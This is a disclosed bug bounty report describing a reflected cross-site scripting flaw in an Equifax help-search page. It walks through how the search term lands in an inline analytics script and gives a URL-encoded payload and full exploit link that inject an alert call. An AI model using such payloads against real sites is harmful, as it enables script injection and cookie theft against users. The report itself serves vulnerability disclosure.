# reflected XSS in [www.equifax.com]

## Report Details
- **Report ID**: 1818163
- **URL**: https://hackerone.com/reports/1818163
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-12-28T19:33:35.566Z
- **Disclosed**: 2023-04-23T12:41:20.748Z

## Reporter
- **Username**: abdoubouanik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: equifax

## Vulnerability Information
hi , I hope you are well, i found reflected XSS in this endpoint:
```https://www.equifax.com/personal/help/search?search=broook```



###Steps:
1.  open ```https://www.equifax.com/personal/help/search?search=broook```
2. view the source code of the page and search for word  ```broook```  you will find that it reflected in the source code:
{F2094830}



3. ```broook``` word reflected in javascript code:
```
<script type="text/javascript">
           window.onload = function(e){
            	Analytics.trackEvent('emptySearch',{internalSearchTerm: "broook" , numOfSearchResultsReturned: 0});
            	}
           </script>
```


-

-



4. By using this payload ```%22%20%2C%20internalSearchTerm%3A%20%5B7%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b```  , I  modified the parameters of the ```Analytics.trackEvent``` function to be like this:
```
<script type="text/javascript">
	      window.onload = function(e){
	          Analytics.trackEvent('SEARCHRETURNED',{internalSearchTerm: "" , internalSearchTerm: [7].map(alert) , numOfSearchResultsReturned: "b" , numOfSearchResultsReturned: 167});            	
	               	}
	     </script>

```
{F2094863}

-
-

5. the following is the link with my XSS payload :   https://www.equifax.com/personal/help/search?search=%22%20%2C%20internalSearchTerm%3A%20%5B7%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b


{F2094867}

## Impact

an attacker can exeute JS codes on the victims and this could be steal user's cookies

## Attachments
- Screenshot_2022-12-28_19-46-38.png
- Screenshot_2022-12-28_20-20-28.png
- Screenshot_2022-12-28_20-15-53.png
